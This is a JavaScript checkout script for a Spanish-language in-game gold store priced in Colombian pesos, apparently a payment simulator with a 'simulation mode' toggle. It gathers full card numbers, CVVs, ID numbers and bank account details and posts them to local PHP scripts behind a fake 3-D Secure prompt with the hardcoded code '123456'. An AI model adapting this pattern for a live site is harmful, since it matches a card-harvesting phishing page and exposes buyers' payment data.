(function () {
            const products = {
                1: { name: ' 80 Gold', precio: 4900, price: '4.900 COP' },
                2: { name: ' 170 Gold', precio: 9900, price: '9.900 COP' },
                3: { name: ' 360 Gold', precio: 19900, price: '19.900 COP' },
                4: { name: ' 660 Gold', precio: 34900, price: '34.900 COP' },
                5: { name: ' 1120 Gold', precio: 54900, price: '54.900 COP' },
                6: { name: ' 2240 Gold', precio: 99900, price: '99.900 COP' },
                7: { name: ' 4480 Gold', precio: 179900, price: '179.900 COP' },
                8: { name: ' 8960 Gold', precio: 299900, price: '299.900 COP' },
            };

            function updateCheckout(id) {
                const p = products[id];
                if (!p) return;
                document.getElementById('checkoutName').textContent = p.name;
                document.getElementById('checkoutPrice').textContent = p.price;

                const imgEl = document.getElementById('checkoutImg');
                const cardImg = document.querySelector('.product-card[data-id="' + id + '"] img');
                if (imgEl && cardImg) {
                    imgEl.src = cardImg.getAttribute('src');
                    imgEl.style.display = '';
                } else if (imgEl) {
                    imgEl.style.display = 'none';
                }
            }

            function initCards() {
                const cards = document.querySelectorAll('.product-card');
                if (cards.length === 0) { setTimeout(initCards, 100); return; }
                cards.forEach(function (card) {
                    card.addEventListener('click', function () {
                        cards.forEach(c => c.classList.remove('selected'));
                        card.classList.add('selected');
                        updateCheckout(parseInt(card.getAttribute('data-id')));
                    });
                });
                var def = document.querySelector('.product-card[data-id="3"]');
                if (def) { def.classList.add('selected'); updateCheckout(3); }
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initCards);
            } else { initCards(); }

            // ── Tabs método de pago ──
            window.setPayment = function (method) {
                document.getElementById('currentPayment').value = method;
                document.getElementById('tabTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('tabCuenta').classList.toggle('active', method === 'cuenta');
                document.getElementById('formTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('formCuenta').classList.toggle('active', method === 'cuenta');
            };

            // Formatear tarjeta
            document.getElementById('cardNumber').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 16);
                this.value = v.replace(/(.{4})/g, '$1 ').trim();
            });
            document.getElementById('cardExpiry').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 4);
                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
                this.value = v;
            });

            // ── 3DS MODAL ──
            const overlay = document.getElementById('tdsOverlay');
            const tdsStatus = document.getElementById('tdsStatus');
            const tdsDigits = document.querySelectorAll('.tds-digit');
            const TDS_CODE = '123456';
            let tdsVerified = false;
            let pendingForm = null;

            // Auto-avance entre dígitos
            tdsDigits.forEach(function (input, idx) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value && idx < tdsDigits.length - 1) tdsDigits[idx + 1].focus();
                    const code = Array.from(tdsDigits).map(d => d.value).join('');
                    if (code.length === 6) verifyTds(code);
                });
                input.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !this.value && idx > 0) tdsDigits[idx - 1].focus();
                });
            });

            function verifyTds(code) {
                if (code === TDS_CODE) {
                    tdsVerified = true;
                    tdsDigits.forEach(d => d.classList.add('success'));
                    tdsStatus.className = 'tds-status ok';
                    tdsStatus.textContent = '✔ Autenticación exitosa. Procesando pago...';
                    setTimeout(function () {
                        overlay.classList.remove('show');
                        if (pendingForm) {
                            document.body.appendChild(pendingForm);
                            pendingForm.submit();
                        }
                    }, 1000);
                } else {
                    tdsVerified = false;
                    tdsDigits.forEach(d => d.classList.add('error'));
                    tdsStatus.className = 'tds-status err';
                    tdsStatus.textContent = '❌ Código incorrecto. Inténtalo de nuevo.';
                    setTimeout(function () {
                        tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                        tdsDigits[0].focus();
                        tdsStatus.className = 'tds-status';
                    }, 1500);
                }
            }

            // Cancelar modal
            document.getElementById('btnTdsCancel').addEventListener('click', function () {
                overlay.classList.remove('show');
                tdsVerified = false;
                pendingForm = null;
                tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                tdsStatus.className = 'tds-status';
            });

            // ── Modo de simulación ──
            let modoSimulacion = 'elegir';
            window.setModo = function (modo) {
                modoSimulacion = modo;
                document.getElementById('modoElegir').classList.toggle('active', modo === 'elegir');
                document.getElementById('modoAuto').classList.toggle('active', modo === 'auto');
                document.getElementById('modoHint').textContent = (modo === 'elegir')
                    ? 'Elige manualmente cómo termina la transacción.'
                    : 'El estado se asigna automáticamente, como un pago real.';
            };

            // Botón pagar → mostrar modal 3DS obligatorio
            document.getElementById('btnPagar').addEventListener('click', function () {
                const jugadorId = document.getElementById('jugadorIdInput').value.trim();
                if (!jugadorId) { alert('⚠️ Por favor ingresa tu ID de jugador.'); return; }

                const selected = document.querySelector('.product-card.selected');
                if (!selected) { alert('⚠️ Por favor selecciona un producto.'); return; }

                const method = document.getElementById('currentPayment').value;
                let nombre, correo, telefono, tipoDoc, numDoc;

                if (method === 'tarjeta') {
                    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
                    const cvv = document.getElementById('cardCvv').value;
                    const expiry = document.getElementById('cardExpiry').value;
                    nombre = document.getElementById('cardName').value.trim();
                    correo = document.getElementById('bsCorreo').value.trim();
                    telefono = document.getElementById('bsTelefono').value.trim();
                    tipoDoc = document.getElementById('bsTipoDoc').value;
                    numDoc = document.getElementById('bsNumDoc').value.trim();
                    if (!cardNum || cardNum.length < 15) { alert('⚠️ Ingresa un número de tarjeta válido.'); return; }
                    if (!expiry) { alert('⚠️ Ingresa la fecha de vencimiento.'); return; }
                    if (!cvv) { alert('⚠️ Ingresa el CVV.'); return; }
                } else {
                    nombre = document.getElementById('cuentaNombre').value.trim();
                    correo = document.getElementById('cuentaCorreo').value.trim();
                    telefono = document.getElementById('cuentaTelefono').value.trim();
                    tipoDoc = document.getElementById('cuentaTipoDoc').value;
                    numDoc = document.getElementById('cuentaNumDoc').value.trim();
                }

                if (!nombre || !correo || !telefono || !numDoc) {
                    alert('⚠️ Por favor completa todos los campos del titular.');
                    return;
                }

                const id = parseInt(selected.getAttribute('data-id'));
                const p = products[id];

                // Armar formulario pero NO enviarlo aún
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = (modoSimulacion === 'auto')
                    ? '../php/crear_pb_gateway.php'
                    : '../estados-gateway.php';

                const campos = [
                    ['producto', p.name], ['precio', p.precio],
                    ['jugador_id', jugadorId], ['metodo', method],
                    ['card_name', nombre], ['correo', correo],
                    ['telefono', telefono], ['tipo_doc', tipoDoc],
                    ['num_doc', numDoc]
                ];

                // Si es tarjeta, agregar datos de tarjeta
                if (method === 'tarjeta') {
                    campos.push(
                        ['card_number', document.getElementById('cardNumber').value.replace(/\s/g, '')],
                        ['card_cvv', document.getElementById('cardCvv').value],
                        ['card_expiry', document.getElementById('cardExpiry').value]
                    );
                } else {
                    campos.push(
                        ['num_cuenta', document.getElementById('cuentaNumero').value],
                        ['cuenta_banco', document.getElementById('cuentaBanco').value]
                    );
                }

                campos.forEach(function (pair) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = pair[0];
                    input.value = pair[1];
                    form.appendChild(input);
                });

                pendingForm = form;

                // Mostrar modal 3DS
                overlay.classList.add('show');
                setTimeout(function () { tdsDigits[0].focus(); }, 200);
            });

            // Cerrar modal al click fuera
            overlay.addEventListener('click', function (e) {
                if (e.target === overlay) {
                    overlay.classList.remove('show');
                    tdsVerified = false;
                    pendingForm = null;
                    tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                    tdsStatus.className = 'tds-status';
                }
            });
        })();
